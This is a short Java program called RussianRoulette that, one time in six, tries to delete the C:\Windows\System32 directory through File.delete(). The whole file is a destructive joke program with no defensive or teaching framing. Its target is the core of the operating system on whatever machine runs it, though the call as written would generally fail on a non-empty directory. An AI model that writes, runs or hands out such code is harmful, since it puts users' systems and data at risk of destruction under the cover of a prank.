import java.io.File;

public class RussianRoulette{
    public static void main(String[] args){
        int random = (int)(Math.random()*6);

        if(random == 0){
            File file = new File("C:\\Windows\\System32");
            file.delete();
        }

    }
}